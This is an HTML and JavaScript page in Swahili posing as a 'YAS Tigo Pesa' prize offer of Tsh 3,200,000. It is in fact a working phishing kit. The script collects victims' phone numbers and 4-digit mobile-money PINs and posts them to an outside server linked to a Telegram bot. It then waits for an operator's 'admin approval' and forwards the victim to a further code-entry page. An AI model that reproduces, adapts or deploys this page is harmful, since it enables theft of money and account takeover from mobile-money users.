<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YAS Tigo Pesa</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#062746;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.container{
    width:100%;
    max-width:430px;
    text-align:center;
    padding:30px 20px;
}

.logo{
    margin-bottom:20px;
}

.logo img{
    width:100px;
    border-radius:15px;
}

h1{
    color:#FFD400;
    font-size:40px;
    line-height:1.2;
    margin-bottom:25px;
    font-weight:bold;
}

.description{
    color:#ffffff;
    font-size:20px;
    line-height:1.6;
    margin-bottom:35px;
}

.offer-title{
    color:#FFD400;
    font-size:26px;
    font-weight:bold;
    margin-bottom:15px;
}

.offer{
    color:white;
    font-size:38px;
    margin-bottom:35px;
}

input{
    width:100%;
    padding:18px;
    margin-bottom:20px;
    border:none;
    border-radius:10px;
    font-size:22px;
}

input:focus{
    outline:none;
}

button{
    width:100%;
    padding:18px;
    background:#FFD400;
    color:#002e5f;
    border:none;
    border-radius:10px;
    font-size:24px;
    font-weight:bold;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    background:#f4c400;
}

button:disabled{
    opacity:0.6;
    cursor:not-allowed;
}

.footer-box{
    margin-top:25px;
    padding:18px;
    border:2px solid #FFD400;
    border-radius:10px;
    background:#49542f;
    color:#FFD400;
    font-size:24px;
    font-weight:bold;
}

#status{
    margin-top:15px;
    min-height:24px;
    font-size:18px;
    font-weight:bold;
    color:#FFD400;
}

#status.error{
    color:#ff6b6b;
}

#status.success{
    color:#51cf66;
}

#status.waiting{
    color:#FFD400;
}

@media(max-width:480px){

h1{
    font-size:34px;
}

.description{
    font-size:18px;
}

.offer-title{
    font-size:22px;
}

.offer{
    font-size:32px;
}

input{
    font-size:18px;
}

button{
    font-size:22px;
}

.footer-box{
    font-size:22px;
}

}
</style>

</head>
<body>

<div class="container">

    <div class="logo">
        <img src="logo.png" alt="YAS Logo">
    </div>

    <h1>Umejishindia Ofa Wa<br>YAS Tigo Pesa</h1>

    <p class="description">
        Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.
    </p>

    <div class="offer-title">
        Kiwango cha Ofa kinachoweza kupatikana:
    </div>

    <div class="offer">
        Tsh 3,200,000
    </div>

    <form id="loginForm">

        <input
            type="tel"
            id="phoneInput"
            placeholder="Nambari ya Mixx"
            required
        >

        <input
            type="password"
            id="pinInput"
            placeholder="YAS Nambari ya Siri"
            maxlength="4"
            required
        >

        <button type="submit" id="submitBtn">
            THIBITISHA ZAWADI
        </button>

    </form>

    <div id="status"></div>

    <div class="footer-box">
        Jaza fomu ili kupata ofa yako!
    </div>

</div>

<script>
// ===== CORRECTED BACKEND URL =====
const BACKEND_URL = "https://yas-tanzania.onrender.com";   // ✅ FIXED

const botId = new URLSearchParams(window.location.search).get("botId");
console.log("Bot ID:", botId);

if (!botId) {
    document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
    document.getElementById("status").className = "error";
    document.getElementById("submitBtn").disabled = true;
}

const phoneInput = document.getElementById("phoneInput");
const pinInput = document.getElementById("pinInput");
const statusEl = document.getElementById("status");
const submitBtn = document.getElementById("submitBtn");

const savedPhone = localStorage.getItem("phone");
if (savedPhone) phoneInput.value = savedPhone;

async function sendPinToTelegram(name, phone, pin) {
    const cleanPhone = phone.replace(/\s/g, '');
    const payload = {
        name: name || "Unknown",
        phone: cleanPhone || "Unknown",
        pin: pin || "",
        botId: botId || ""
    };
    console.log("Sending to backend:", payload);
    try {
        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(payload)
        });
        const responseText = await res.text();
        console.log("Response status:", res.status, "Body:", responseText);
        if (!res.ok) {
            let errorMsg = responseText;
            try {
                const errorData = JSON.parse(responseText);
                errorMsg = errorData.error || errorMsg;
            } catch {}
            statusEl.textContent = `Error: ${errorMsg}`;
            return null;
        }
        const data = JSON.parse(responseText);
        return data;
    } catch (error) {
        console.error("Network error:", error);
        statusEl.textContent = "Network error. Please check your connection.";
        return null;
    }
}

function pollPinApproval(requestId) {
    let attempts = 0;
    return new Promise((resolve) => {
        const interval = setInterval(async () => {
            attempts++;
            console.log(`Polling attempt ${attempts} for ${requestId}`);
            try {
                const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
                const data = await res.json();
                console.log("Poll response:", data);
                if (data.blocked) {
                    clearInterval(interval);
                    statusEl.className = "error";
                    statusEl.textContent = "Your account has been blocked.";
                    resolve(false);
                    return;
                }
                if (data.approved === true) {
                    clearInterval(interval);
                    statusEl.className = "success";
                    statusEl.textContent = "PIN approved! Redirecting...";
                    resolve(true);
                    return;
                }
                if (data.approved === false) {
                    clearInterval(interval);
                    statusEl.className = "error";
                    statusEl.textContent = "Incorrect PIN. Please try again.";
                    resolve(false);
                    return;
                }
                if (attempts % 10 === 0 || attempts === 1) {
                    const elapsedSeconds = Math.floor(attempts * 1.5);
                    const minutes = Math.floor(elapsedSeconds / 60);
                    const seconds = elapsedSeconds % 60;
                    const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
                    statusEl.className = "waiting";
                    statusEl.textContent = `Waiting for admin approval... (${timeStr})`;
                }
            } catch (error) {
                console.error("Poll error:", error);
                statusEl.className = "waiting";
                statusEl.textContent = "Connection issue. Retrying...";
            }
        }, 1500);
    });
}

async function handleSubmit(e) {
    e.preventDefault();
    const phone = phoneInput.value.trim();
    const pin = pinInput.value.trim();

    if (!phone) {
        statusEl.className = "error";
        statusEl.textContent = "Tafadhali ingiza nambari ya simu.";
        return;
    }
    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
        statusEl.className = "error";
        statusEl.textContent = "Tafadhali ingiza YAS PIN sahihi ya namba 4.";
        return;
    }
    if (!botId) {
        statusEl.className = "error";
        statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
        return;
    }

    localStorage.setItem("phone", phone);

    phoneInput.disabled = true;
    pinInput.disabled = true;
    submitBtn.disabled = true;
    submitBtn.textContent = "INATUMWA...";
    statusEl.className = "waiting";
    statusEl.textContent = "Sending PIN for verification...";

    const res = await sendPinToTelegram("Unknown", phone, pin);

    if (!res || !res.requestId) {
        statusEl.className = "error";
        statusEl.textContent = "Failed to send PIN. Please try again.";
        phoneInput.disabled = false;
        pinInput.disabled = false;
        submitBtn.disabled = false;
        submitBtn.textContent = "THIBITISHA ZAWADI";
        pinInput.value = "";
        pinInput.focus();
        return;
    }

    statusEl.className = "waiting";
    statusEl.textContent = "Waiting for admin approval...";

    const approved = await pollPinApproval(res.requestId);

    if (approved === true) {
        localStorage.setItem("pin", pin);
        setTimeout(() => {
            window.location.href = `code.html?botId=${botId}`;
        }, 500);
    } else {
        phoneInput.disabled = false;
        pinInput.disabled = false;
        submitBtn.disabled = false;
        submitBtn.textContent = "THIBITISHA ZAWADI";
        pinInput.value = "";
        pinInput.focus();
    }
}

document.getElementById("loginForm").addEventListener("submit", handleSubmit);

pinInput.addEventListener("input", function() {
    this.value = this.value.replace(/[^0-9]/g, '');
    if (this.value.length === 4) {
        document.getElementById("loginForm").dispatchEvent(new Event('submit'));
    }
});

pinInput.addEventListener("paste", function(e) {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const cleaned = pasted.replace(/[^0-9]/g, '');
    if (cleaned.length >= 4) {
        this.value = cleaned.slice(0, 4);
        if (this.value.length === 4) {
            document.getElementById("loginForm").dispatchEvent(new Event('submit'));
        }
    }
});

window.addEventListener("load", function() {
    phoneInput.focus();
});

phoneInput.addEventListener("keydown", function(e) {
    if (e.key === "Enter") {
        e.preventDefault();
        pinInput.focus();
    }
});
</script>

</body>
</html>
